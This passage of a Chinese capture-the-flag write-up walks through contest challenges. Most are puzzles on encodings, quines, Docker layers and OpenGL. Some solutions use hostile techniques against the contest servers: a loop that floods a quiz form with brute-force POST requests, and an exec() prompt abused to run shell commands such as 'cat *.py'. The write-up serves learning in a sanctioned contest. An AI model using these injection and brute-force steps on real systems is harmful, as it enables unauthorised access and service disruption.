class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FormData</span>();    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q1'</span>, i);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, j);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.<span class=\"hljs-title function_\">text</span>()).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-title class_\">HTMLActuator</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">message</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) {  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).<span class=\"hljs-title function_\">toLowerCase</span>();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();  request.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">'GET'</span>, url);  request.<span class=\"hljs-property\">responseType</span> = <span class=\"hljs-string\">'text'</span>;  request.<span class=\"hljs-property\">onload</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {    <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"game-message-extra\"</span>).<span class=\"hljs-property\">innerHTML</span> = request.<span class=\"hljs-property\">response</span>;  };  request.<span class=\"hljs-title function_\">send</span>();  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-property\">classList</span>.<span class=\"hljs-title function_\">add</span>(type);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].<span class=\"hljs-property\">textContent</span> = message;  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">clearContainer</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>.<span class=\"hljs-title function_\">appendChild</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">scoreTweetButton</span>());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-variable constant_\">XLSX</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">NzhCN</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-property\">utils</span>.<span class=\"hljs-title function_\">sheet_to_json</span>(xlsx.<span class=\"hljs-property\">Sheets</span>[xlsx.<span class=\"hljs-property\">SheetNames</span>[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).<span class=\"hljs-title function_\">split</span>(i);    <span class=\"hljs-keyword\">if</span> (tmp.<span class=\"hljs-property\">length</span> === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = <span class=\"hljs-title class_\">NzhCN</span>.<span class=\"hljs-title function_\">decodeB</span>(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.<span class=\"hljs-property\">yuan</span> * <span class=\"hljs-number\">100</span> + moneyData.<span class=\"hljs-property\">jiao</span> * <span class=\"hljs-number\">10</span> + moneyData.<span class=\"hljs-property\">fen</span>;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count/<span class=\"hljs-number\">100</span>).toFixed(<span class=\"hljs-number\">2</span>)}</span>}`</span>); <span class=\"hljs-comment\">// 直接打印 flag</span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ <span class=\"hljs-built_in\">cat</span> flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ <span class=\"hljs-built_in\">chmod</span> +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span 